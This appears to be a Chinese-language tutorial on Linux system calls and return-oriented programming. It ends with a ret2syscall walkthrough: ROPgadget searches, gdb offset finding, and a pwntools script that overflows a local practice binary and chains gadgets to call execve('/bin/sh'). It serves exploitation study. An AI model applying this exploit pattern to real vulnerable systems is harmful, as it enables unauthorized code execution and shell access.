前置知识

假设有以下程序

#include <stdio.h>
char shellcode[0x100] = "hello world";
my_puts(){
    write(1, shellcode, 0x100);
}
int main(){
    my_puts();
    return 0;
}

代码很简单,就是输出字符串"hello world" 但这一串代码在操作系统层面如何实现?

flowchart LR
    A["my_puts()"] --> B["write()"] --> C["sys_write()"] --> D["标准输出"]

my_puts()调用了动态链接库libc.so中的write()函数 write(1,&“hello world”,12) write()将传入参数包装为汇编代码[eax = 4;ebx = 1;ecx = &"hello world";edx = 12;] + int 0x80; write()函数其实就是对write系统调用的封装 执行完成后才进入了内核kernel中的sys_write()函数 sys_write()函数会将字符串"hello world"写入到标准输出设备中

  • 什么是系统调用
  1. 系统调用是操作系统提供给用户态程序调用的接口，它是操作系统内核与用户态程序之间的接口，它提供了系统调用的入口，用户态程序通过系统调用与内核进行交互。
  2. 本质上时一些内核函数代码(一段指令),以规范的方式驱动硬件
  3. x86通过int 0x80指令实现系统调用,amd64通过syscall指令实现系统调用
  • 什么是libc.so 这是一个动态链接库，它包含了系统调用的实现，如open(),read(),write()等等,libc.so随着系统版本更新也会进行更新 操作系统如何调用不同版本的libc的同一个函数呢? 这里可以类比Windows系统创建的快捷方式,无论软件版本怎么变化,快捷方式都指向同一个文件,当快捷方式被点击时,系统会自动调用对应的程序

system()函数

有了上面的基础,可以知道system()其实是对execve()系统调用的封装,execve()可以执行外部可执行文件,system()可以执行外部命令

mov eax, 0xb ; execve系统调用号,在x86架构中,eax寄存器存放系统调用号
mov ebx, ["/bin/sh"]
mov ecx, 0
mov edx, 0
int 0x80 ; 调用系统调用

这段汇编实现了execve("/bin/sh",0,0)系统调用,即执行/bin/sh命令

但是在程序中没有存在这一段汇编怎么办? 请看ROP-返回导向编程

ROP(Return-Oriented Programming)-返回导向编程

ROP是一种攻击技术，它利用程序的控制流和数据结构，通过控制程序的执行流程，以达到控制目标程序的目的。

gadget

gadget就是位于text段的可执行代码，它可以被用来控制程序的执行流程。

在Linux系统中,可以只用ROPgadget来获取gadget

ROPgadget --binary file --only "pop|ret"

我们随便找一行看看再ida中是什么样的

0x080481c9 : pop ebx ; ret

可以看到这两行汇编指令的意思就是将栈顶的数值弹出到ebx寄存器中,然后再将栈顶的地址pop给eip

知道了这些,就可以开始构造system()函数的ROP链了

构造ROP链

  • 流程图 随着ROP链的变化,可能不完全是流程图里所说的,但大体思路是这样的
; 准备参数
pop eax ; ret
pop ebx ; ret
pop ecx ; ret
pop edx ; ret

; 调用execve("/bin/sh",0,0)
mov eax, 0xb ; execve系统调用号,在x86架构中,eax寄存器存放系统调用号
mov ebx, ["/bin/sh"]
mov ecx, 0
mov edx, 0
int 0x80 ; 调用系统调用

ret2syscall

利用ROPgadget分别用

ROPgadget --binary rop --only 'pop|ret'
ROPgadget --binary rop --string '/bin/sh'
ROPgadget --binary rop --only 'int' #系统调用

找到

0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x080bb196 : pop eax ; ret
0x08049421 : int 0x80
0x080be408 : /bin/sh

gdb调试程序,找到栈溢出点 输入废物数据填充缓冲区,找到字符串开始的地方和ebp的地方分别为

0xffffcabc ;开始填充
0xffffcb28 ;ebp

  • 构造exploit
from pwn import *
r = process('./rop')
context.arch = 'i386' #设置架构

# 找到gadget
pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
bin_sh = 0x080be408
'''
构造payload
使用flat自动地将多种类型的输入（整数、字符串、字节串、嵌套列表等）“打平”并按上下文（字长、大小端）正确地打包成一个连续的 bytes 对象，省去了手动 p32()/p64()、拼接和填充的繁琐步骤
'''
payload = flat([
    b'a' *(0xffffcb28 - 0xffffcabc + 4),
    pop_eax_ret,
    0xb,
    pop_edx_ecx_ebx_ret,
    0,
    0,
    bin_sh,
    int_0x80
])
r.sendline(payload)
r.interactive() #进入交互模式
